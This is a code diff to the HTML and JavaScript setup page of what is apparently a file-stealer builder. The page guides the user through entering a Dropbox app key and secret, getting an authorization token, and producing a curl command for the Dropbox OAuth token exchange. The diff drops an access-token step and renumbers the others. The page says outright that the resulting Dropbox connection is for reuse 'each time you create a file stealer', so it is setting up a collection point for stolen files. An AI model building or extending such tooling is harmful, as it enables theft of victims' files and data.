@@ -13,7 +13,6 @@
     <script>
         var key = ""; // Variable to store app key
         var secret = ""; // Variable to store app secret
-        var accessToken = ""; // Variable to store access token
         var authorizationToken = ""; // Variable to store authorization token
         
         window.onload = function() {
@@ -75,11 +74,6 @@
             secret = document.getElementById("userInput2").value;
             alert("App secret saved: " + secret);
             updateCurlCommand();
-        }
-        
-        function saveInput1() {
-            accessToken = document.getElementById("userInput1").value;
-            alert("Access token saved: " + accessToken);
         }
         
         function saveAuthToken() {
@@ -379,23 +373,9 @@
                         <button onclick="saveInput2()">Submit</button>
                     </div>
                 </div>
-                <div class="step">
-                    <h2>Step 3: Enter your Access token</h2>
-                    <p>Go to the "Settings" tab -> OAuth 2 -> Generated Access token and copy the token that you generate. <b>Important: This token will expire in 4 hours</b>, so you will only use this one to get your refresh token</p>
-                    <div class="input-group">
-                        <input type="text" id="userInput1" placeholder="Enter first value">
-                        <button onclick="saveInput1()">Submit</button>
-                    </div>
-                </div>
                 
-                <div class="action-button" onclick="showPage('next-steps')">Next page</div>
-            </div>
-            
-            <!-- script setup Page -->
-            <div id="next-steps">
-                <h1>Setup the connection to your app</h1>
                 <div class="step">
-                    <h2>Step 1: Get your Authorization token</h2>
+                    <h2>Step 3: Get your Authorization token</h2>
                     <p>Now that you've entered your app key, click the button below to get your authorization token:</p>
                     
                     <div class="action-button" onclick="openAuthLink()">Autorisation token link</div>
@@ -408,8 +388,14 @@
                     </div>
                 </div>
                 
+                <div class="action-button" onclick="showPage('next-steps')">Next page</div>
+            </div>
+            
+            <!-- script setup Page -->
+            <div id="next-steps">
+                <h1>Setup the connection to your app</h1>
                 <div class="step">
-                    <h2>Step 2: Get your unique code</h2>
+                    <h2>Step 1: Get your unique code</h2>
                     <p>Copy the code below and save it somewhere, as it is the unique connection for your dropbox account and you can use it each time you create a file stealer. The values have been automatically filled with the information you have imputed until now:</p>
                     <div class="code-block">
                         <span id="curlCommand">curl https://api.dropbox.com/oauth2/token -d code=AUTHORIZATION_TOKEN -d grant_type=authorization_code -u APP_KEY:APP_SECRET</span>
